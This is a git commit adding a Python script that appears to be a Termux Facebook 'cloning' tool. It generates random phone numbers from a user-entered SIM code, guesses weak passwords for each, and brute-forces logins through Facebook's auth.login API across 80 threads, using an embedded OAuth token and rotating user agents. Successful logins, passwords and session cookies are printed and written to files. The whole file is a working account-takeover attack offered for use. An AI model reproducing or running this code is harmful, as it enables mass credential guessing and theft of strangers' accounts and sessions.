2e36b1bb505fa2c2344d895475096f807c4e0c78
Sikder1o <sikderobaidur25@gmail.com>
2024-11-21 18:24:03 +0600

    Add files via upload

---
+++ UPDET-ON.py
@@ -0,0 +1,181 @@
+#Crete : @Kalyanvai
+#TG : https://t.me/KGF_TERMUX_TEAM
+import os
+os.system("pip uninstall requests -y")
+os.system("pip install requests")
+from os import system as clr
+import random
+import string 
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests
+from bs4 import BeautifulSoup as bxx
+import re
+import sys
+import uuid
+import json
+import platform,math,smtplib
+import platform
+import smtplib
+import math
+import httpx
+import os,base64,zlib,pip,urllib
+from os import path
+import requests,random,uuid,string,hashlib,json
+from os import path
+from urllib.request import urlopen
+import os,base64,zlib,pip,urllib,urllib3
+
+print('\n\033[1;37m install modules...')
+
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        print('\n Installing missing modules ...')
+        os.system('pip install requests futures==2 > /dev/null')
+        os.system('python DX.py')
+
+
+os.system('xdg-open https://t.me/Boss_xdSIKDERKING')
+#-------------color----------------#
+bblack="\033[1;30m"         # Black
+M="\033[1;31m"            # Red
+H="\033[1;32m"         # Green
+byellow="\033[1;33m"        # Yellow
+bblue="\033[1;34m"          # Blue
+P="\033[1;35m"        # Purple
+C="\033[1;36m"          # Cyan
+B="\033[1;37m"         # White
+my_color = [
+ B,C,P,H]
+warna = random.choice(my_color)
+oks=[]
+cps=[]
+loop=0
+#---------------------UPDET UGER AGENTS 🫶❤️-----
+def randBuildLSB():
+    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
+    VAPP = random.randint(410000000,499999999)
+    END = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
+   #[FBAN/FB4A;FBAV/#287.0.0.50.119;FBPV/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]
+    END = "[FBAN/MessengerLite;FBAV/288.0.0.5.115;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/346850586;FBCR/TNT;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1472};]"
+    
+    END = "[FBAN/FB4A;FBAV/339.0.0.32.118;FBBV/323006995;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/325030047;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+    
+    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
+    return ua
+
+
+#______________uger Agents______
+KALYAN_VAI_POWER = requests.get("https://raw.githubusercontent.com/KGF-KiNG/Updet-UA/main/UA.txt").text.splitlines()
+
+TARA_505 = random.choice(KALYAN_VAI_POWER)
+logo=(f''''\x1b[38;5;48m';
+$$\   $$\ $$$$$$\ $$\   $$\  $$$$$$\  
+$$ | $$  |\_$$  _|$$$\  $$ |$$  __$$\ 
+$$ |$$  /   $$ |  $$$$\ $$ |$$ /  \__|
+$$$$$  /    $$ |  $$ $$\$$ |$$ |$$$$\ 
+$$  $$<     $$ |  $$ \$$$$ |$$ |\_$$ |
+$$ |\$$\    $$ |  $$ |\$$$ |$$ |  $$ |
+$$ | \$$\ $$$$$$\ $$ | \$$ |\$$$$$$  |
+\__|  \__|\______|\__|  \__| \______/'\x1b[38;5;48m'; ''')
+
+def linex():
+    print(f'{warna}--------------------------------------------{B}')
+
+def clear():
+    clr('clear')
+    print(logo)
+
+def TARA_LOVE():
+    clear()
+    os.system('xdg-open https://t.me/Boss_xdSIKDERKING')
+    print(f'{B} [{warna}01{B}] \33[0;41mRANDOM CLONING\033[0;92m ')
+    print(f'{B} [{warna}02{B}] \33[0;41mJOIN teligerm  GROUP\033[0;92m ')
+    print(f'{B} [{warna}03{B}] CONTACT WHATSAPP')
+    print(f'{B} [{warna}00{B}] EXIT PROGRAMING')
+    linex()
+    option=input(f' {B}[{warna}??{B}] CHOOSE OPTION>> ')
+    if option in ['01','1']:
+        BD_CLONING()
+    if option in ['02','2']:
+    	os.system('xdg-open https://www.facebook.com/profile.php?id=100086270594350?ref=share');time.sleep(1)
+    if option in ['03','3']:
+    	os.system('xdg-open https://t.me/Boss_xdSIKDERKING');time.sleep(1)
+    else:
+        exit(' Thanks for using dear :)')
+
+def BD_CLONING():
+    user=[]
+    clear()
+    print(' EXAMPLE SIM CODE : [016] [017] [013] [019][018]')
+    code=input(' ENTER SIM CODE >> ')
+    linex()
+    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [99999]')
+    try:
+        limit=int(input(' ENTER LIMIT >> '))
+    except ValueError:
+        limit=50000
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with tred(max_workers=80) as Tara:
+        tl=str(len(user))
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+code)
+        print(' \33[0;42mFAST SPEED CLONING\033[0;92m ')
+        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
+        linex()
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','abir123','taniya']
+            Tara.submit(method_crack,ids,passlist)
+    linex()
+    print(' THE PROGRESS HAS BEEN COMPLETE ')
+    print(' TOTAL OK ID '+str(len(oks)))
+    print(' TOTAL CP ID '+str(len(cps)))
+    input(' PRESS ENTER TO BACK  : ')
+    TARA_LOVE()
+
+def method_crack(ids,passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write('\r\r \033[1;37m[SIKDER-KING😊🌺] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': TARA_505, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://api.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m[SIKDER-KING🌺😊-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;37m [COOKIE-🌸] '+coki)
+                    open('/sdcard/SIKDER-KING-OK.txt','a').write(str(uid)+' | '+pas+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;35m[SIKDER-KING-SAD🥹😓-CP] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/SIKDER-KING-SAD-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+
+TARA_LOVE()
